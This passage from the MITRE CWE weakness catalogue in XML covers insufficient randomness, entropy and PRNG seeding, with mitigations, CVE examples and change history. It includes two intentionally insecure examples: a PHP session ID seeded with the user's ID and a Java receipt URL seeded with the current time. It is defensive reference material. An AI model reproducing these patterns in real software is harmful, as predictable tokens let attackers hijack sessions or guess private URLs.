                           <xhtml:li>Focused Manual Spotcheck - Focused manual analysis of source</xhtml:li>
                           <xhtml:li>Manual Source Code Review (not inspections)</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Source code Weakness Analyzer</xhtml:li>
                           <xhtml:li>Context-configured Source Code Weakness Analyzer</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Architecture or Design Review</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>
                  <xhtml:p>Use a well-vetted algorithm that is currently considered to be strong by experts in the field, and select well-tested implementations with adequate length seeds.</xhtml:p>
                  <xhtml:p>In general, if a pseudo-random number generator is not advertised as being cryptographically secure, then it is probably a statistical PRNG and should not be used in security-sensitive contexts.</xhtml:p>
                  <xhtml:p>Pseudo-random number generators can produce predictable numbers if the generator is known and the seed can be guessed. A 256-bit seed is a good starting point for producing a "random enough" number.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Consider a PRNG that re-seeds itself as needed from high quality pseudo-random output sources, such as hardware devices.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Testing</Phase>
               <Description>Use automated static analysis tools that target this type of weakness. Many modern techniques use data flow analysis to minimize the number of false positives. This is not a perfect solution, since 100% accuracy and coverage are not feasible.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-2">
               <Phase>Architecture and Design</Phase>
               <Phase>Requirements</Phase>
               <Strategy>Libraries or Frameworks</Strategy>
               <Description>Use products or modules that conform to FIPS 140-2 [REF-267] to avoid obvious entropy problems. Consult FIPS 140-2 Annex C ("Approved Random Number Generators").</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Testing</Phase>
               <Description>Use tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session. These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-45">
               <Intro_Text>This code attempts to generate a unique random identifier for a user's session.</Intro_Text>
               <Example_Code Nature="Bad" Language="PHP">
                  <xhtml:div>function generateSessionID($userID){<xhtml:div style="margin-left:1em;">srand($userID);<xhtml:br/>return rand();</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>Because the seed for the PRNG is always the user's ID, the session ID will always be the same. An attacker could thus predict any user's session ID and potentially hijack the session.</Body_Text>
               <Body_Text>This example also exhibits a Small Seed Space (CWE-339).</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-46">
               <Intro_Text>The following code uses a statistical PRNG to create a URL for a receipt that remains active for some period of time after a purchase.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>String GenerateReceiptURL(String baseUrl) {<xhtml:div style="margin-left:1em;">Random ranGen = new Random();<xhtml:br/>ranGen.setSeed((new Date()).getTime());<xhtml:br/>return(baseUrl + ranGen.nextInt(400000000) + ".html");</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>This code uses the Random.nextInt() function to generate "unique" identifiers for the receipt pages it generates. Because Random.nextInt() is a statistical PRNG, it is easy for an attacker to guess the strings it generates. Although the underlying design of the receipt system is also faulty, it would be more secure if it used a random number generator that did not produce predictable receipt identifiers, such as a cryptographic PRNG.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2020-7010</Reference>
               <Description>Cloud application on Kubernetes generates passwords using a weak random number generator based on deployment time.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2020-7010</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-3278</Reference>
               <Description>Crypto product uses rand() library function to generate a recovery key, making it easier to conduct brute force attacks.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-3278</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-3238</Reference>
               <Description>Random number generator can repeatedly generate the same value.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-3238</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-2367</Reference>
               <Description>Web application generates predictable session IDs, allowing session hijacking.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-2367</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-2158</Reference>
               <Description>Password recovery utility generates a relatively small number of random passwords, simplifying brute force attacks.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-2158</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-0255</Reference>
               <Description>Cryptographic key created with a seed based on the system time.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-0255</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-5162</Reference>
               <Description>Kernel function does not have a good entropy source just after boot.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-5162</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-4905</Reference>
               <Description>Blogging software uses a hard-coded salt when calculating a password hash.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-4905</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-4929</Reference>
               <Description>Bulletin board application uses insufficiently random names for uploaded files, allowing other users to access private files.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-4929</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-3612</Reference>
               <Description>Handheld device uses predictable TCP sequence numbers, allowing spoofing or hijacking of TCP connections.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-3612</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-2433</Reference>
               <Description>Web management console generates session IDs based on the login time, making it easier to conduct session hijacking.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-2433</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-0166</Reference>
               <Description>SSL library uses a weak random number generator that only generates 65,536 unique keys.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-0166</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-2108</Reference>
               <Description>Chain: insufficient precision causes extra zero bits to be assigned, reducing entropy for an API function that generates random numbers.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-2108</Link>
            </Observed_Example>
	   <Observed_Example>
	     <Reference>CVE-2008-2108</Reference>
	     <Description>Chain: insufficient precision (CWE-1339) in
	     random-number generator causes some zero bits to be reliably
	     generated, reducing the amount of entropy (CWE-331)</Description>
	     <Link>https://www.cve.org/CVERecord?id=CVE-2008-2108</Link>
	   </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-2020</Reference>
               <Description>CAPTCHA implementation does not produce enough different images, allowing bypass using a database of all possible checksums.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-2020</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-0087</Reference>
               <Description>DNS client uses predictable DNS transaction IDs, allowing DNS spoofing.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-0087</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-0141</Reference>
               <Description>Application generates passwords that are based on the time of day.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-0141</Link>
            </Observed_Example>
         </Observed_Examples>
         <Functional_Areas>
            <Functional_Area>Cryptography</Functional_Area>
            <Functional_Area>Authentication</Functional_Area>
            <Functional_Area>Session Management</Functional_Area>
         </Functional_Areas>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Randomness and Predictability</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="7 Pernicious Kingdoms">
               <Entry_Name>Insecure Randomness</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A2</Entry_ID>
               <Entry_Name>Broken Access Control</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <Entry_ID>CON33-C</Entry_ID>
               <Entry_Name>Avoid race conditions when using library functions</Entry_Name>
               <Mapping_Fit>Imprecise</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <Entry_ID>MSC30-C</Entry_ID>
               <Entry_Name>Do not use the rand() function for generating pseudorandom numbers</Entry_Name>
               <Mapping_Fit>CWE More Abstract</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <Entry_ID>MSC32-C</Entry_ID>
               <Entry_Name>Properly seed pseudorandom number generators</Entry_Name>
               <Mapping_Fit>CWE More Abstract</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="WASC">
               <Entry_ID>11</Entry_ID>
               <Entry_Name>Brute Force</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="WASC">
               <Entry_ID>18</Entry_ID>
               <Entry_Name>Credential/Session Prediction</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="The CERT Oracle Secure Coding Standard for Java (2011)">
               <Entry_ID>MSC02-J</Entry_ID>
               <Entry_Name>Generate strong random numbers</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="112"/>
            <Related_Attack_Pattern CAPEC_ID="485"/>
            <Related_Attack_Pattern CAPEC_ID="59"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-267"/>
            <Reference External_Reference_ID="REF-207"/>
            <Reference External_Reference_ID="REF-7" Section="Chapter 8, &#34;Using Poor Random Numbers&#34; Page 259"/>
            <Reference External_Reference_ID="REF-44" Section="&#34;Sin 20: Weak Random Numbers.&#34; Page 299"/>
         </References>
         <Notes>
            <Note Type="Relationship">This can be primary to many other weaknesses such as cryptographic errors, authentication errors, symlink following, information leaks, and others.</Note>
			<Note Type="Maintenance">
			  As of CWE 4.3, CWE-330 and its descendants are being
			  investigated by the CWE crypto team to identify gaps
			  related to randomness and unpredictability, as well as
			  the relationships between randomness and cryptographic
			  primitives.  This "subtree analysis" might
			  result in the addition or deprecation of existing
			  entries; the reorganization of relationships in some
			  views, e.g. the research view (CWE-1000); more consistent
			  use of terminology; and/or significant modifications to
			  related entries.
			</Note>
	   <Note Type="Maintenance">As of CWE 4.5, terminology related to randomness, entropy, and
	   predictability can vary widely. Within the developer and other
	   communities, "randomness" is used heavily. However, within
	   cryptography, "entropy" is distinct, typically implied as a
	   measurement. There are no commonly-used definitions, even within
	   standards documents and cryptography papers. Future versions of
	   CWE will attempt to define these terms and, if necessary,
	   distinguish between them in ways that are appropriate for
	   different communities but do not reduce the usability of CWE for
	   mapping, understanding, or other scenarios.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Background_Details, Relationships, Other_Notes, Relationship_Notes, Taxonomy_Mappings, Weakness_Ordinalities</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-11-24</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-01-12</Modification_Date>
               <Modification_Comment>updated Description, Likelihood_of_Exploit, Other_Notes, Potential_Mitigations, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-12-28</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Common_Consequences, Description, Observed_Examples, Potential_Mitigations, Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated References, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-04-05</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Detection_Factors, Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, References, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Observed_Examples, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-02-18</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Detection_Factors</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Functional_Areas, Likelihood_of_Exploit, Modes_of_Introduction, References, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated References</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Description, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-03-15</Modification_Date>
					<Modification_Comment>updated Maintenance_Notes, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-07-20</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples, Maintenance_Notes, Observed_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Observed_Examples, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Common_Consequences, Description</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2008-04-11">Randomness and Predictability</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="331" Name="Insufficient Entropy" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The product uses an algorithm or scheme that produces insufficient entropy, leaving patterns or clusters of values that are more likely to occur than others.</Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="330" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="330" View_ID="1003" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Scope>Other</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Other</Impact>
               <Note>An attacker could guess the random numbers generated and could gain unauthorized access to a system if the random numbers are used for authentication and authorization.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Determine the necessary entropy to adequately provide for randomness and predictability. This can be achieved by increasing the number of bits of objects such as keys and seeds.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-45">
               <Intro_Text>This code generates a unique random identifier for a user's session.</Intro_Text>
               <Example_Code Nature="Bad" Language="PHP">
                  <xhtml:div>function generateSessionID($userID){<xhtml:div style="margin-left:1em;">srand($userID);<xhtml:br/>return rand();</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>Because the seed for the PRNG is always the user's ID, the session ID will always be the same. An attacker could thus predict any user's session ID and potentially hijack the session.</Body_Text>
               <Body_Text>This example also exhibits a Small Seed Space (CWE-339).</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-46">
               <Intro_Text>The following code uses a statistical PRNG to create a URL for a receipt that remains active for some period of time after a purchase.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>String GenerateReceiptURL(String baseUrl) {<xhtml:div style="margin-left:1em;">Random ranGen = new Random();<xhtml:br/>ranGen.setSeed((new Date()).getTime());<xhtml:br/>return(baseUrl + ranGen.nextInt(400000000) + ".html");</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>This code uses the Random.nextInt() function to generate "unique" identifiers for the receipt pages it generates. Because Random.nextInt() is a statistical PRNG, it is easy for an attacker to guess the strings it generates. Although the underlying design of the receipt system is also faulty, it would be more secure if it used a random number generator that did not produce predictable receipt identifiers, such as a cryptographic PRNG.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2001-0950</Reference>
               <Description>Insufficiently random data used to generate session tokens using C rand(). Also, for certificate/key generation, uses a source that does not block when entropy is low.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2001-0950</Link>
            </Observed_Example>
	   <Observed_Example>
	     <Reference>CVE-2008-2108</Reference>
	     <Description>Chain: insufficient precision (CWE-1339) in
	     random-number generator causes some zero bits to be reliably
	     generated, reducing the amount of entropy (CWE-331)</Description>
	     <Link>https://www.cve.org/CVERecord?id=CVE-2008-2108</Link>
	   </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Insufficient Entropy</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="WASC">
               <Entry_ID>11</Entry_ID>
               <Entry_Name>Brute Force</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <Entry_ID>MSC32-C</Entry_ID>
               <Entry_Name>Properly seed pseudorandom number generators</Entry_Name>
               <Mapping_Fit>Exact</Mapping_Fit>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="59"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-207"/>
         </References>
	 <Notes>
	   <Note Type="Maintenance">As of CWE 4.5, terminology related to randomness, entropy, and
	   predictability can vary widely. Within the developer and other
	   communities, "randomness" is used heavily. However, within
	   cryptography, "entropy" is distinct, typically implied as a
	   measurement. There are no commonly-used definitions, even within
	   standards documents and cryptography papers. Future versions of
	   CWE will attempt to define these terms and, if necessary,
	   distinguish between them in ways that are appropriate for
	   different communities but do not reduce the usability of CWE for
	   mapping, understanding, or other scenarios.</Note>
	 </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Demonstrative_Examples, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Modes_of_Introduction, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-07-20</Modification_Date>
					<Modification_Comment>updated Maintenance_Notes, Observed_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description</Modification_Comment>
				</Modification>
         </Content_History>
      </Weakness>
      <Weakness ID="335" Name="Incorrect Usage of Seeds in Pseudo-Random Number Generator (PRNG)" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The product uses a Pseudo-Random Number Generator (PRNG) but does not correctly manage seeds.</Description>
		 <Extended_Description>
		   <xhtml:p>
		   PRNGs are deterministic and, while their output appears
		   random, they cannot actually create entropy. They rely on
		   cryptographically secure and unique seeds for entropy so
		   proper seeding is critical to the secure operation of the
		   PRNG.</xhtml:p>
		   <xhtml:p>
		   Management of seeds could be broken down into two main areas:
		   </xhtml:p>
		   <xhtml:ul>
			 <xhtml:li>
		   (1) protecting seeds as cryptographic material (such as a cryptographic key);
			 </xhtml:li>
			 <xhtml:li>
		   (2) whenever possible, using a uniquely generated seed from
		   a cryptographically secure source
			 </xhtml:li>
		   </xhtml:ul>
			 <xhtml:p>
			   PRNGs require a seed as input to generate a stream of
			   numbers that are functionally indistinguishable from
			   random numbers.  While the output is, in many cases,
			   sufficient for cryptographic uses, the output of any
			   PRNG is directly determined by the seed provided as
			   input. If the seed can be ascertained by a third party,
			   the entire output of the PRNG can be made known to
			   them. As such, the seed should be kept secret and
			   should ideally not be able to be guessed. For example,
			   the current time may be a poor seed. Knowing the
			   approximate time the PRNG was seeded greatly reduces
			   the possible key space.
			 </xhtml:p>
			 <xhtml:p>
			   Seeds do not necessarily need to be unique, but reusing seeds may open up attacks if the seed is discovered.
			 </xhtml:p>
		 </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="330" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="330" View_ID="1003" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
